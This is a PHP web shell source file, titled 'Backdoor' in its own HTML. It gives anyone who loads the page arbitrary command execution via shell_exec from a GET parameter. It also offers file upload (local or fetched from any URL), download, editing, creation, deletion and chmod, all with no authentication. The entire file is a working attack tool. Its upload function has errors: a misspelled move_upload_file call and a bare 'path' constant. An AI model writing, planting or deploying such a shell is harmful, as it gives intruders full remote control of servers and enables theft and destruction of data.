<?php

	function command_shell($cmd){
		if(strncmp($cmd, "cd ", 3) == 0){
			$cmd = explode(" ", $cmd);
			if(chdir($cmd[1]))
				return getcwd();
			return "Change fail";
		}	
		return shell_exec($cmd);
	}

	
	function upload($files, $path){
		$status = false;
		if($path[strlen($path) - 1] != '/')
			$path = $path . '/';
		for($index = 0; $index < count($files['name']); $index++){
			$tmp = $files['tmp_name'][$index];
			$name = $files['name'][$index];			
			$status = move_upload_file($tmp, path . $name);
		}
		if($status == true)
			return "Upload successfully";
		return "Upload fail";
	}


	function upload_url($url){
		$data = file_get_contents($url);
		if(file_put_contents(basename($url), $data))
			return "Download successfully";							
		return "Download fail";
	}
	

	function download($filename){
		if(file_exists($filename)){
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename=' . basename($filename));
			header('Content-Transfer-Encoding: binary');
			header('Content-Length: ' . filesize($filename));
			ob_clean();
			readfile($filename);
			exit(0);
		}		
	}


	function edit_file($file){
		$data = "";
		$data = file_get_contents($file);
		return $data;
	}


	function save_file($name, $content){
		if(file_put_contents($name, $content))
			return "Save successfully";
		return "Save fail";
	}


	function remove_file($name){
		if(unlink($name) == true)
			return "Remove  successfully";
		return "Remove fail";
	}


	function create_file($name){
		if(fopen($name, "w") != false)
			return "Create successfully";
		return "Create fail";
	}
	
	function set_perm($name, $perm){
		if(chmod($name, $perm) != false)
			return "Perm successfully";
		return "Perm fail";
	}

	
	if(isset($_POST['pm']) && ! empty($_POST['permfile']) && ! empty($_POST['perm']))
		$res_perm = set_perm($_POST['permfile'], $_POST['perm']);
		

	if(isset($_POST['cr']) && ! empty($_POST['createfile']))
		$res_create = create_file($_POST['createfile']);
		

	if(isset($_POST['rm']) && ! empty($_POST['namefile']))
	   $res_del = remove_file($_POST['namefile']);


	if(isset($_POST['edit']) && ! empty($_POST['editfile']))
		$content = edit_file(trim($_POST['editfile']));
	

	if(isset($_POST['save']) && ! empty($_POST['editfile']) && ! empty($_POST['content']))
		$res_save = save_file($_POST['editfile'], $_POST['content']);
	   
	if(isset($_GET['run']) && ! empty($_GET['cmd']))
		$result = command_shell(trim($_GET['cmd'], " "));
	
	
	if(isset($_POST['upload']) && ! empty($_POST['path']))
		$result_upload = upload($_FILES['f'], $_POST['path']);
		
		
	if(isset($_POST['uploadURL']) && ! empty($_POST['url']))
		$result_upload_url = upload_url(trim($_POST['url'], " "));


	if(isset($_POST['down']) && ! empty($_POST['load']))
		download(trim($_POST['load'], " "));
?>


<html>
	<title>Backdoor</title>
	<body>		
		<div id="up">
			<div id="left">			
				<form method="GET">
					<label><b>Command shell</b></label><br>
					<input type="text" name="cmd" size="67">
					<input type="submit" value="Run" name="run"><br>
					<label>Output shell</label><br>
					<textarea rows="20" cols="100"><?php print_r($result); ?></textarea>
				</form>
			</div>
		</div>
		<div id="down">
			<div>
				<form enctype="multipart/form-data" method="POST">
					<label><b>Upload local files</b></label><br>
					<input type="file" name="f[]" multiple>					
					<input type="text" name="path" size="39" placeholder="Path">
					<input type="hidden" name="MAX_FILE_SIZE" value="30000">
					<input type="submit" value="Upload" name="upload"><br>
					<label><?php echo $result_upload; ?></label>
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Upload url file</b></label><br>				
					<input type="text" name="url" size="71" placeholder="URL">				
					<input type="submit" value="Upload URL" name="uploadURL"><br>
					<label><?php echo $result_upload_url; ?></label>
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Download file</b></label><br>					
					<input type="text" name="load" size="71" placeholder="Path">
					<input type="submit" value="Download" name="down">
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Remove file</b></label><br>					
					<input type="text" name="namefile" size="71" placeholder="Path">
					<input type="submit" value="Remove" name="rm"><br>
					<label><?php echo $res_del; ?></label>
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Create file</b></label><br>					
					<input type="text" name="createfile" size="71" placeholder="Path">
					<input type="submit" value="Create" name="cr"><br>
					<label><?php echo $res_create; ?></label>
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Permission file</b></label><br>					
					<input type="text" name="permfile" size="71" placeholder="Path">
					<input type="text" name="perm" size="5" placeholder="Perm">
					<input type="submit" value="Perm" name="pm"><br>
					<label><?php echo $res_perm; ?></label>
				</form>
			</div>
			<div>
				<form method="POST">
					<label><b>Edit file</b></label><br>		
					<input type="text" name="editfile" size="71" value="<?php print_r($_POST['editfile']); ?>" placeholder="Path"><br>
					<textarea rows="20" cols="94" name="content"><?php print_r($content); ?></textarea><br>
					<input type="submit" value="Edit" name="edit">
					<input type="submit" value="Save" name="save"><br>
					<label><?php echo $res_save; ?></label>
				</form>
			</div>
		</div>
		<style type="text/css">			
			#output{				
				max-height: 1000px;
				max-width: 1000px;
				overflow-x: auto;
				margin-top: 0px;
				margin-bottom: 20px;
				border-bottom: 1px solid #eee;				
			}
			#up{
				float: left;
			}
			
			#down{
				float: right;				
			}		
		</style>
	</body>
</html>

